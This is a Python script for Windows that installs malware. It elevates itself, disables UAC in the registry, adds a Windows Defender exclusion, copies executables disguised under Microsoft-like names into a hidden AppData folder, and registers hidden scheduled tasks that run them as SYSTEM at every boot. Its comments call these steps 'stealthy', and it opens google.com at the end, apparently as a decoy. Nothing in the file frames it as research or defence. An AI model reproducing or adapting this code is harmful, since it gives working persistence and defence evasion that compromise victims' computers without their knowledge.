import os
import shutil
import ctypes
import winreg as reg
from elevate import elevate
from webbrowser import open as open_t
import subprocess
from time import sleep
import sys
import win32com.client
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

if not is_admin():
    elevate()

def disable_uac():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        uac_keys = {
            "EnableLUA": 0,
            "ConsentPromptBehaviorAdmin": 0,
            "ConsentPromptBehaviorUser": 0,
        }
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
            for name, value in uac_keys.items():
                reg.SetValueEx(key, name, 0, reg.REG_DWORD, value)
                # print(f"{name} set to {value}")
    except Exception as e:
        pass

source_path_exe = 'UXPlatformService.exe'
source_updater = 'updater.exe'
checker = "checker.exe"
appdata_path = os.path.expandvars(r"%APPDATA%\Microsoft\MS32")
destination_path_exe = os.path.join(appdata_path, 'UXPlatformService.exe')
destination_updater = os.path.join(appdata_path, 'updater.exe')
dest_checker = os.path.join(appdata_path,checker)

if os.path.exists(appdata_path):
    shutil.rmtree(appdata_path)
os.mkdir(appdata_path)

path = os.path.expandvars(r"%APPDATA%\Microsoft")

def run_powershell_command(command):
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            shell=True
        )
        if result.returncode != 0:
            raise Exception(result.stderr.strip())
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {e}"

def add_persistence(exe_path, task_name="Windows Service Host"):
    TASK_TRIGGER_BOOT = 8
    TASK_ACTION_EXEC = 0
    TASK_CREATE_OR_UPDATE = 6
    TASK_LOGON_SERVICE_ACCOUNT = 5
    TASK_RUNLEVEL_HIGHEST = 1

    try:
        service = win32com.client.Dispatch("Schedule.Service")
        service.Connect()
        rootFolder = service.GetFolder("\\")
        taskDef = service.NewTask(0)

        # Registration info (stealthy)
        taskDef.RegistrationInfo.Description = ""
        taskDef.RegistrationInfo.Author = ""

        # Trigger: At startup
        trigger = taskDef.Triggers.Create(TASK_TRIGGER_BOOT)
        trigger.Enabled = True

        # Action: Run your EXE
        action = taskDef.Actions.Create(TASK_ACTION_EXEC)
        action.Path = exe_path

        # Settings (stealth & reliability)
        s = taskDef.Settings
        s.Enabled = True
        s.Hidden = True
        s.DisallowStartIfOnBatteries = False
        s.StopIfGoingOnBatteries = False
        s.StartWhenAvailable = True
        s.RunOnlyIfIdle = False
        s.IdleSettings.StopOnIdleEnd = False
        s.IdleSettings.RestartOnIdle = False
        s.AllowHardTerminate = False
        s.ExecutionTimeLimit = "PT0S"  # no time limit

        # Run as SYSTEM with highest privileges
        principal = taskDef.Principal
        principal.UserId = "SYSTEM"
        principal.LogonType = TASK_LOGON_SERVICE_ACCOUNT
        principal.RunLevel = TASK_RUNLEVEL_HIGHEST

        # Register task
        rootFolder.RegisterTaskDefinition(
            task_name,
            taskDef,
            TASK_CREATE_OR_UPDATE,
            "", "",  # No creds needed for SYSTEM
            TASK_LOGON_SERVICE_ACCOUNT
        )

        print(f"[+] Persistence task '{task_name}' created.")
        return True

    except Exception as e:
        print(f"[!] Failed to create persistence task: {e}")
        return False

command = f"Add-MpPreference -ExclusionPath '{path}'"
run_powershell_command(command)

disable_uac()
add_persistence(destination_path_exe)
add_persistence(dest_checker,task_name="Microsoft UX Platform")

try:
    shutil.copy(source_path_exe, destination_path_exe)
    print(f"File copied from {source_path_exe} to {destination_path_exe}")
    subprocess.run(["attrib","+h","+s",destination_path_exe],shell=True)
    
    shutil.copy(checker, dest_checker)
    print(f"File copied from {source_path_exe} to {destination_path_exe}")
    subprocess.run(["attrib","+h","+s",dest_checker],shell=True)
    
    shutil.copy(source_updater, destination_updater)
    print(f"File copied from {source_updater} to {destination_updater}")
    subprocess.run(["attrib","+h","+s",destination_updater],shell=True)
    subprocess.run(["attrib","+h","+s",appdata_path],shell=True)
    
    command = [
    "schtasks", "/create",
    "/tn", "Windows Service Host",
    "/tr", destination_path_exe,
    "/sc", "ONSTART",
    "/ru", "SYSTEM",
    "/rl", "HIGHEST",
    "/NP", "/F"
    ]

    subprocess.run(command, shell=True)
    open_t("https://google.com")
    # os.system("shutdown /s /t 0")
    sleep(3)
    sys.exit(0)
except FileNotFoundError as e:
    print("Error: Source file or folder not found.")
    print(f"Details: {e}")

except PermissionError as e:
    print("Error: Permission denied while accessing the destination.")
    print(f"Details: {e}")

except Exception as e:
    print(f"An unexpected error occurred: {e}")
